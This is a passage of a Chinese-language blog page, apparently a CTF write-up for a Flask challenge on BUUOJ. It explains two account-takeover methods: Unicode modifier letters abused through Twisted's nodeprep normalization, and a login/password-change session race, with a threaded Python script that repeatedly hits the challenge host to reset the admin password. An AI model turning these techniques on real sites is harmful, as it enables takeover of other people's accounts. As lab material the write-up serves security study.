redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>         <br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br> <br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">error</span>):<br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strlower</span>(<span class="hljs-params">username</span>):                                          <span class="hljs-comment">#2</span><br>    username = nodeprep.prepare(username)<br><span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure>
+<p>我们注意到#1处的代码。change函数就是change password页面修改密码的那一段代码。#1处应该是使用strlower函数将用户名改为小写，它并没有用到字符串的lower方法。我们跳到strlower处（#2处）看看发现其使用的nodeprep.prepare()，而nodeprep是从Twisted模块导入的，在requirements.txt文件中(就当是有)发现Twisted==10.2.0。这是一个比较老的版本，存在漏洞的可能性很大。<br>
+nodeprep.prepare()会把Modifier Letter Capital(间距修饰字母)改为大写字母。<br>
+ᴬᴰᴹᴵᴺ<br>
+使用一次nodeprep.prepare()<br>
+-&gt; ADMIN<br>
+再使用一次nodepre.prepare()<br>
+-&gt; admin<br>
+那么我们的具体思路就是使用ᴬᴰᴹᴵᴺ注册用户名，因为登录的时候使用了一次nodeprep.prepare()，把ᴬᴰᴹᴵᴺ改为admin，然后修改密码，ADMIN就会变成admin，然后使用admin账号登录，得到flag。</p>
+<h2><span id="条件竞争">条件竞争</span></h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br> <br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name                                       <span class="hljs-comment">#1</span><br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])                             <span class="hljs-comment">#2</span><br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br></code></pre></td></tr></table></figure>
+<p>上述代码表示，1、在登录时是直接将登陆表单中的用户名赋值给session[‘name’]；且不需要密码是不是正确（需要用bp抓包，直接登录session里面只有一瞬间改变）<br>
+2、在修改密码的时候是直接将session[‘name’]即用户名赋值给name，然后对name用户进行修改密码。未进行安全的身份验证，也就可能存在以下一种可能：我们注册一个用户test，现在有一个进程1登录了test用户  然后重复进行改密码操作  因为改密码需要session[‘name’]来判断是修改的那个用户，所以改密码时一直用的是test用户的session；进程2一直以admin用户进行登录密码正确与否无所谓，此时会创建一个session，内容里面name=admin，即session[‘name’]内容admin。</p>
+<p>那么就会是不是有可能当进程1进行到改密码操作时，进程2恰好进行登录，此时进程1改密码需要一个session[‘name’]赋值给name来判断是修改哪一个用户的密码，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。<br>
+python脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">s, username, password</span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>        <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/login&quot;</span>, data=data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s.get(<span class="hljs-string">&quot;http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/logout&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">s, newpassword</span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;newpassword&#x27;</span>:newpassword<br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/change&quot;</span>, data=data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">s</span>):<br>    login(s, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>)<br>    change(s, <span class="hljs-string">&#x27;test&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">s</span>):<br>    logout(s)<br>    res = login(s, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finish&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        s = requests.Session()<br>        t1 = threading.Thread(target=func1, args=(s,))<br>        t2 = threading.Thread(target=func2, args=(s,))<br>        t1.start()<br>        t2.start()<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>挺看运气的</p>
+
+
+  
+
+</article>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
